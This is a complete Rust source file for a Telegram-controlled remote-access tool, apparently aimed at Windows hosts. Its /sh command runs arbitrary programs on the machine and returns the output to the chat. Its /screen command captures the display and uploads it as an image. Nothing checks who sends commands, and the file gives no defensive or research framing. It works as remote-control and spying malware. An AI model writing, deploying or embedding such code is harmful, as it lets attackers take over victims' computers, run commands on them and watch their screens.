use std::io::Cursor;
use std::process::Command as StdCommand;
use teloxide::types::InputFile;
use teloxide::{prelude::*, RequestError};
use teloxide::utils::command::BotCommands;
use win_screenshot::prelude::*;
use image::{DynamicImage, ImageBuffer};


#[tokio::main]
async fn main() {
    let bot = Bot::from_env();
    Command::repl(bot, answer).await;
}

#[derive(BotCommands, Clone)]
#[command(rename_rule = "lowercase", description = "These commands are supported:")]
enum Command {
    #[command(description = "help")]
    Help,
    #[command(description = "shell command")]
    Sh(String),
    #[command(description = "screenshot")]
    Screen,
}

async fn sh_command_handler(cmd: String, msg: Message, bot: Bot) -> Result<Message, RequestError> {
    let parts: Vec<&str> = cmd.split(" ").collect();
    let prog = parts[0];
    let mut sh_cmd = StdCommand::new(prog);
    for part in parts.iter().skip(1) {
        sh_cmd.arg(part);
    }
    let output = sh_cmd.output().expect("Command failed");
    let str = String::from_utf8_lossy(&output.stdout);
    bot.send_message(msg.chat.id, str).await
}

async fn screenshot_command_handler(bot: Bot, msg: Message) -> Result<Message, RequestError> {
    let buf = capture_display().unwrap();
    let data = buf.pixels;
    let buf2 = ImageBuffer::from_raw(buf.width, buf.height, data).unwrap();
    let img = DynamicImage::ImageRgb8(buf2);
    let mut png: Vec<u8> = Vec::new();
    let mut cur = Cursor::new(png);
    img.write_to(&mut cur, image::ImageOutputFormat::Png).expect("Failed converting image");
    let photo = InputFile::memory(cur.into_inner());
    bot.send_photo(msg.chat.id, photo).await
}

async fn answer(bot: Bot, msg: Message, cmd: Command) -> ResponseResult<()> {
    match cmd {
        Command::Help => bot.send_message(msg.chat.id, Command::descriptions().to_string()).await?,
        Command::Sh(cmd) => sh_command_handler(cmd, msg, bot).await?,
        Command::Screen => screenshot_command_handler(bot, msg).await?,
    };
    Ok(())
}
